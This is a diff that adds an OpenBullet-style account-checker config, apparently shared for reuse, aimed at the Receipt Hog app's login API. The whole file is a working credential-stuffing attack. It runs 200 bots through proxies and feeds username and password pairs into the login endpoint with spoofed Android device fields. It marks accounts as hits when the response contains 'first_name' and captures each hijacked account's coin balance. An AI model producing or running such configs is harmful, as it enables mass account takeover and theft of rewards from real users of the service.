@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "Receipt Hog",
+  "SuggestedBots": 200,
+  "LastModified": "2018-05-21T17:57:16.4563528+00:00",
+  "AdditionalInfo": "",
+  "Author": "Jeff199",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://app.receipthog.com/api/user/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST_LOGIN REQUEST POST "https://app.receipthog.com/api/user/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&ad_id=dec9c446-30fe-47f3-ac74-e97f3b3039b8&android_sdk_version=19&locale=en_IQ&device_id=20689d8f42ab5257&mobile_os_version=4.4.2&format=json&mobile_os=ANDROID&password=<PASS>&version=4.1.5" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "InvalidPassword" 
+  KEYCHAIN Success OR 
+    KEY "first_name" 
+PARSE "<SOURCE>" LR "coin_balance\":" "," Recursive=FALSE -> CAP "Points" "" "" 
